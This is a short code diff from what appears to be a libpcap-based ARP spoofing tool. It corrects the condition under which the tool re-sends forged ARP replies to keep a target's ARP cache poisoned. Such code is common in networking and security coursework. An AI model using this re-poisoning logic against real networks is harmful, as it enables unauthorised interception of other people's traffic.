@@ -170,8 +170,8 @@ void* thread_arp_processor(char* interface)
                         pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
                         pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
                     }
-                    if ((!memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN)) &&
-                            (ntohl(arpHeader->dstIP) == shareData.targetIP))
+                    if (!(memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN)) &&
+                            (ntohl(arpHeader->dstIP) == shareData.senderIP))
                     {
                         pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
                         pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
